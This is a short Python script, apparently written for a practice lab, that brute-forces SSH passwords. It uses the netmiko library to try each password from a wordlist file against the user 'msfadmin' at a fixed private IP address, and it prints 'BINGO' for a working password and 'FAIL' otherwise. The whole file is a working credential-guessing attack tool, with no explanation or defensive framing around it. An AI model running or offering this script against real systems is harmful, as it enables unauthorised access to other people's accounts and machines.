#!/usr/bin/python

from netmiko import Netmiko

wordlist = 'word.txt'
user = 'msfadmin'
ip = '11.11.11.171'

print('[*] - SSH Bruteforce Attack')
print('[*] - Target:', ip)

with open(wordlist, 'r') as _wordlist:
    for _line in _wordlist:
        _pass = _line.strip('\n')

        try:
            sshconn = Netmiko("11.11.11.171", username=user, password=_pass, device_type="linux")
            print('[+] BINGO - Username:', user, 'Password:', _pass)
            sshconn.disconnect()

        except:
            print('[-] FAIL - Username:', user, 'Passwor:', _pass)

